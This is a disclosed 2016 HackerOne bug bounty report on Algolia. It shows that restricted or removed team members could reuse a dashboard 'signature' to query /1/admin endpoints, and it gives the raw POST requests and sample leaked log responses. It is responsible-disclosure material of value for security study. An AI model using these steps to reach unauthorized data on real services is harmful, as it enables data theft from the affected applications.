# Unauthorized team members can leak information and see all API calls through /1/admin/* endpoints, even after they have been removed.

## Report Details
- **Report ID**: 156520
- **URL**: https://hackerone.com/reports/156520
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2016-08-04T15:26:03.980Z
- **Disclosed**: 2016-11-27T16:43:28.832Z

## Reporter
- **Username**: eboda
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: algolia

## Vulnerability Information
Summary
-------------

Invited team members or collaborators on https://www.algolia.com/manage/applications/[APP_ID]/team can use the `/1/admin/*` REST endpoints to leak some information, which they should not be able to have access to.

Steps to reproduce
--------------

1. Invite a new team member to your application and give him very restrictive rights. In my case I gave him  only `Search` rights and limited his access to an index called `test`.
2. Login as the new team member and go to https://www.aloglia.com/dashboard . You will be greeted with a `You don't have access to the Algolia Dashboard.` error message.
3. Check in the page source for `signature` and copy its value, for example on my application it was `fd283b81b38fb9c547fcf2bea763d547e66644839e896e877382b1fcfe598bac`.

    Using this signature, you can perform queries now against `/1/admin/*`, even though you don't have the rights.

/1/admin/listIndexes
---------------

The following request will list all indexes of the application including their statistics:

```
POST /1/admin/listindexes HTTP/1.1
Host: c5-eu-1.algolianet.com
....

{"applicationID":"APP_ID","signature":"SIGNATURE","page":0,"sortByNbEntries":1}
```

Of course you need to replace `applicationID` and `signature` with your own values from above.

/1/admin/userlogs
-----------------

An even more interesting endpoint. Here you can see all past queries made to the application. This includes search queries, records added and deleted, indeces created and removed, etc. for all indeces in the application. This basically leaks data from any index.

```
POST /1/admin/userlogs HTTP/1.1
Host: c5-eu-1.algolianet.com
....

{"applicationID":"APP_ID","signature":"SIGNATURE","offset":0,"length":1000,"type":"all"}
```

This will return the whole request body and the whole response body for each query! So for example if somebody performed a search, the attacker will be able to see the whole result of the search in the response body. 

Here are two example responses, one for searching and the other for adding a record:

**Searching** (as you can see `answer` contains the whole record)
```{js}
{
                "timestamp": "2016-08-04T15:15:01Z",
                "method": "POST",
                "answer_code": "200",
                "query_body": "\n{\n  \"params\": \"query=Monica&page=0&getRankingInfo=1&facets=*&attributesToRetrieve=*&highlightPreTag=%3Cem%3E&highlightPostTag=%3C%2Fem%3E&hitsPerPage=10&facetFilters=%5B%5D&maxValuesPerFacet=100\"\n}\n",
                "answer": "\n{\n  \"hits\": [\n    {\n      \"name\": \"Monica Bellucci\",\n      \"rating\": 3956,\n      \"image_path\": \"/z3sLuRKP7hQVrvSTsqdLjGSldwG.jpg\",\n      \"alternative_name\": \"Monica Anna Maria Bellucci\",\n      \"objectID\": \"5\",\n      \"_highlightResult\": {\n        \"name\": {\n          \"value\": \"<em>Monica</em> Bellucci\",\n          \"matchLevel\": \"full\",\n          \"fullyHighlighted\": false,\n          \"matchedWords\": [\n            \"monica\"\n          ]\n        },\n        \"alternative_name\": {\n          \"value\": \"<em>Monica</em> Anna Maria Bellucci\",\n          \"matchLevel\": \"full\",\n          \"fullyHighlighted\": false,\n          \"matchedWords\": [\n            \"monica\"\n          ]\n        }\n      },\n      \"_rankingInfo\": {\n        \"nbTypos\": 0,\n        \"firstMatchedWord\": 0,\n        \"proximityDistance\": 0,\n        \"userScore\": 499,\n        \"geoDistance\": 0,\n        \"geoPrecision\": 1,\n        \"nbExactWords\": 0,\n        \"words\": 1,\n        \"filters\": 0\n      }\n    }\n  ],\n  \"nbHits\": 1,\n  \"page\": 0,\n  \"nbPages\": 1,\n  \"hitsPerPage\": 10,\n  \"processingTimeMS\": 1,\n  \"facets\": {\n  },\n  \"exhaustiveFacetsCount\": true,\n  \"query\": \"Monica\",\n  \"params\": \"query=Monica&page=0&getRankingInfo=1&facets=*&attributesToRetrieve=*&highlightPreTag=%3Cem%3E&highlightPostTag=%3C%2Fem%3E&hitsPerPage=10&facetFilters=%5B%5D&maxValuesPerFacet=100\",\n  \"serverUsed\": \"c5-eu-3.algolia.net\",\n  \"parsedQuery\": \"monica\",\n  \"timeoutCounts\": false,\n  \"timeoutHits\": false\n}\n",
                "url": "/1/indexes/QQQQQQQQ/query?x-algolia-agent=Algolia%20for%20vanilla%20JavaScript%203.14.1&x-algolia-application-id=5QA3U6N0QN&x-algolia-api-key=3f30****************************",
                "ip": "....",
                "query_headers": "...",
                "sha1": "70a7baf41d4756ad3a01199f336d7c45b9624305",
                "nb_api_calls": "1",
                "processing_time_ms": "1",
                "index": "QQQQQQQQ",
                "query_params": "query=Monica&page=0&getRankingInfo=1&facets=*&attributesToRetrieve=*&highlightPreTag=%3Cem%3E&highlightPostTag=%3C%2Fem%3E&hitsPerPage=10&facetFilters=%5B%5D&maxValuesPerFacet=100",
                "query_nb_hits": "1"
            }
```
**Adding a record**
```{js}
 {
                "timestamp": "2016-08-04T15:14:56Z",
                "method": "POST",
                "answer_code": "201",
                "query_body": "\n{\n  \"name\": \"Just a test\",\n  \"rating\": 1337,\n  \"image_path\": \"Record added\",\n  \"alternative_name\": \"Everything leaked\",\n  \"objectID\": \"5111\"\n}\n",
                "answer": "\n{\n  \"createdAt\": \"2016-08-04T15:14:56.405Z\",\n  \"taskID\": 18077851,\n  \"objectID\": \"5111\"\n}\n",
                "url": "/1/indexes/QQQQQQQQ?x-algolia-agent=Algolia%20for%20vanilla%20JavaScript%203.14.1&x-algolia-application-id=****&x-algolia-api-key=3f30****************************",
                "ip": "xxxxx",
                "query_headers": "...",
                "sha1": "ee9f6ad7345be899f3a81b0b150bb75c9abc46e3",
                "nb_api_calls": "1",
                "processing_time_ms": "1",
                "index": "QQQQQQQQ"
            }
```

Clearly, the attacker can dump all indeces if he just goes back far enough where they were created.

The other two endpoints I found are `/1/admin/stats/INDEXNAME`, which returns the same as `/1/admin/listIndexes`, but only for one specific index and `/1/admin/building`, which purpose I didn't quite figure out.

Final note
-----------

Note that the signature is application specific and completely API key independent.

For one that means, if I use the users API key to list indexes via `/1/indexes` endpoint, it will only return an answer if I ahve given the user `listIndexes` rights and it will only return those indeces he has access to. Whereas with the signature the users rights are completely ignored.

It also means though, that if I remove an old team member he still continues to have access to the above endpoints. Even if the admin regenrates the admin API key, the signature remains the same. Therefore, once a team member obtained the signature, he will have access indefinitely to the application. The owner can't do anything as far as I can tell.

## Attachments
No attachments
